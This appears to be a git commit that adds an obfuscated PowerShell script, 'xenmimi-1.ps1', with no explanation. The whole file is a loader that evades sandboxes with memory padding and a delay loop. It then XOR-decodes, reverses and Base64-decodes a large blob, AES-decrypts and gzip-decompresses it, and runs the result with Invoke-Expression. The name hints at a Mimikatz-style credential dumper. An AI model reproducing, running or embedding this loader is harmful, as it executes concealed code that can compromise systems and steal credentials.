2a64cc166373776e8a399ebd4be4b84ced41dd65
beercheers-lab <ryan.ct.chu@au.ey.com>
2024-08-22 10:11:30 +1000

    Add files via upload

---
+++ xenmimi-1.ps1
@@ -0,0 +1,65 @@
+$rozokvksgz = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
+if ($rozokvksgz -lt 250) { $oipxmpixsv = "a" * 300MB }
+$xgkrjjhjntvyhpki = 0
+$wzzhzijwugjsgh = 30000000
+For ($xgkrjjhjntvyhpki=0; $xgkrjjhjntvyhpki -lt $wzzhzijwugjsgh;$xgkrjjhjntvyhpki++) { $xgkrjjhjntvyhpki++ }
+$uygsrsvrqwoupyoup = [System.Text.Encoding]::UTF8.GetBytes("pqnrthuwhzrwyrsj")
+$zvgszzhwqpnyqy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("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"))
+$rkkpoxjnjzht = [System.Text.Encoding]::UTF8.GetBytes($zvgszzhwqpnyqy)
+$inmvunttutyrqjw = $(for ($pwygxyiwgrh = 0; $pwygxyiwgrh -lt $rkkpoxjnjzht.length; ) {
+    for ($phzhiujyznxni = 0; $phzhiujyznxni -lt $uygsrsvrqwoupyoup.length; $phzhiujyznxni++) {
+        $rkkpoxjnjzht[$pwygxyiwgrh] -bxor $uygsrsvrqwoupyoup[$phzhiujyznxni]
+        $pwygxyiwgrh++
+        if ($pwygxyiwgrh -ge $rkkpoxjnjzht.Length) {
+            $phzhiujyznxni = $uygsrsvrqwoupyoup.length
+        }
+    }
+})
+$inmvunttutyrqjw = [System.Text.Encoding]::UTF8.GetString($inmvunttutyrqjw)
+$nmqykjzrjim = "$inmvunttutyrqjw"
+$mptvhmnppqhjswr = $nmqykjzrjim.ToCharArray()
+[array]::Reverse($mptvhmnppqhjswr)
+$tqwjtinspnhynymp = -join($mptvhmnppqhjswr)
+$pwujpiormrpogop = [System.Convert]::FromBase64String("$tqwjtinspnhynymp")
+$jhoinxuivxyqvt = [System.Convert]::FromBase64String("C21kBagsOV2mpVrOnbwfnjTxtvyI6Pt15NsxIObdPaY=")
+$gizswghinvquxwtu = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
+$vnpmouukzytpw = $gizswghinvquxwtu.ToCharArray()
+[array]::Reverse($vnpmouukzytpw)
+$vsqvxiqkwzomn = -join($vnpmouukzytpw)
+$rrwizovqsvnsjuquz = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($vsqvxiqkwzomn))
+$zysvqzrvgurnrkvpn = New-Object "$rrwizovqsvnsjuquz"
+$gnjmnwguohvroirr = "==wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
+$vuwvgjuvjgt = $gnjmnwguohvroirr.ToCharArray()
+[array]::Reverse($vuwvgjuvjgt)
+$wwymrxptvuswm = -join($vuwvgjuvjgt)
+$qyvskvqhzmgqtrkvg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($wwymrxptvuswm))
+$jhoxpkgosxio = & ([scriptblock]::Create($qyvskvqhzmgqtrkvg))
+$zysvqzrvgurnrkvpn.Mode = $jhoxpkgosxio
+$zvohoutqgzohthqq = "==wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
+$ooopuqmuwiztm = $zvohoutqgzohthqq.ToCharArray()
+[array]::Reverse($ooopuqmuwiztm)
+$uixsgnwzhzovu = -join($ooopuqmuwiztm)
+$woigjomsuokg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($uixsgnwzhzovu))
+$hspsjvuojzq = & ([scriptblock]::Create($woigjomsuokg))
+$zysvqzrvgurnrkvpn.Padding = $hspsjvuojzq
+$zysvqzrvgurnrkvpn.BlockSize = 128
+$zysvqzrvgurnrkvpn.KeySize = 192
+$zysvqzrvgurnrkvpn.Key = $jhoinxuivxyqvt
+$zysvqzrvgurnrkvpn.IV = $pwujpiormrpogop[0..15]
+$zrgxxmxtqopkpvtwm = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
+$wqoyrpgniptx = New-Object $zrgxxmxtqopkpvtwm(,$zysvqzrvgurnrkvpn.CreateDecryptor().TransformFinalBlock($pwujpiormrpogop,16,$pwujpiormrpogop.Length-16))
+$zkjsrowrgmm = New-Object $zrgxxmxtqopkpvtwm
+$wjpgskyirjj = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))
+$vqzkirktiui = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
+$xnptiyqpooxg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0="))
+$jmpqxyhrpmpstj = New-Object $xnptiyqpooxg $wqoyrpgniptx, ($vqzkirktiui::$wjpgskyirjj)
+$jmpqxyhrpmpstj.CopyTo($zkjsrowrgmm)
+$jmpqxyhrpmpstj.Close()
+$zysvqzrvgurnrkvpn.Dispose()
+$wqoyrpgniptx.Close()
+$igzkhtrsyukwyjupw = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
+$hvtgyvpywppsppohk = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
+$nmqorzymorqngn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
+$vrgojnrphvttny = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
+$smssqhormkhzzkg = $igzkhtrsyukwyjupw::$hvtgyvpywppsppohk.$vrgojnrphvttny($zkjsrowrgmm.$nmqorzymorqngn())
+Invoke-Expression($smssqhormkhzzkg)
